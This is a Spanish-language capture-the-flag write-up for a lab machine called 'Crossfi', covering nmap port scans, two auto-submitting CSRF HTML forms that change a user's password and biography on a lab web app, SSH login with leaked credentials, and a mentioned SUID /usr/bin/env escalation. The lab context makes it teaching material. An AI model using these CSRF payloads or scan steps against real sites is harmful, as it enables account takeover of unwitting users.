**Crossfi**
Primero escaneamos los puertos abiertos.
```bash
nmap -sS --open -p- --min-rate 5000 -v -Pn -n machine
```
![[Pasted image 20251127191734.png]]

Aplicamos scripts por defecto y averiguamos la versión.
```bash
nmap -sCV -p22,5000 machine -oN scan
```
![[Pasted image 20251127192048.png]]

Tenemos una web en el puerto 5000 y un servicio **SSH**.

**Web**
![[Pasted image 20251127192205.png]]

Tenemos un panel de autenticación, y la posibilidad de registrarnos.
![[Pasted image 20251127192304.png|1000]]

Vemos un panel para anotar tareas pendientes.
![[Pasted image 20251127192455.png]]


Tenemos un panel que nos permite cambiar contraseña, y un cartel que nos dice lo siguiente.
![[Pasted image 20251127192721.png]]

Nos dice que tenemos que intentar acontecer un **CSRF** cambiando la contraseña desde una fuente externa, quiere decir que lo haremos desde un url que nosotros clicaremos simulando ser la victima, así que creamos un código en **HTML**  index.html para el **CSRF**
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
    <link href="css/style.css" rel="stylesheet">
  </head>
  <body>

    <form id="csrf" action="http://172.17.0.2:5000/change-password" method="POST">
      <input type="hidden" name="new_password" value="hacked">
    </form>
    <script>
      document.getElementById('csrf').submit()
    </script>
  </body>
</html>
```

Creamos un servidor http.
```bash
python3 -m http.server 80
```

Y vamos al localhost para acontecer el **CSRF**.
![[Pasted image 20251127195624.png|1000]]

Tenemos un mensaje:
![[Pasted image 20251127195652.png]]

En el segundo nivel vemos los siguiente:
![[Pasted image 20251127195821.png]]

Uno de estos campos no tienen un **CSRF token** y encontrando el correcto obtendremos las credenciales.
![[Pasted image 20251127195929.png]]

El campo de actualizar biografía no tiene un **CSRF token** así que este es el campo vulnerable, cabe destacar que en el mismo código fuente podemos ver las credenciales **SSH**.
![[Pasted image 20251127200444.png]]

Pero aun así, lo siguiente que tenemos que hacer efectuar el mismo proceso anterior solo que con el campo de update-biografia.
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
    <link href="css/style.css" rel="stylesheet">
  </head>
  <body>

    <form id="csrf" action="http://172.17.0.2:5000/update-biografia" method="POST">
      <textarea class="form-control profile-input mb-2" name="biografia" rows="4" value="asdasdasdasdasdsd" >
      </textarea>
    </form>
    <script>
      document.getElementById('csrf').submit()
    </script>
  </body>
</html>
```

![[Pasted image 20251127201505.png]]


Y entramos al **SSH**
![[Pasted image 20251127201557.png|1200]]

Vemos un archivo .txt de ayuda
![[Pasted image 20251127201628.png]]

y bueno viendo los binarios a nivel SUID vemos lo siguiente:
![[Pasted image 20251127201705.png]]

Nos centramos específicamente en **/usr/bin/env** que se puede explotar haciendo llamada a un binario asi:
![[Pasted image 20251127201803.png|1200]]

Completando la maquina! Canal de YouTube:  https://www.youtube.com/@Rookinghacker
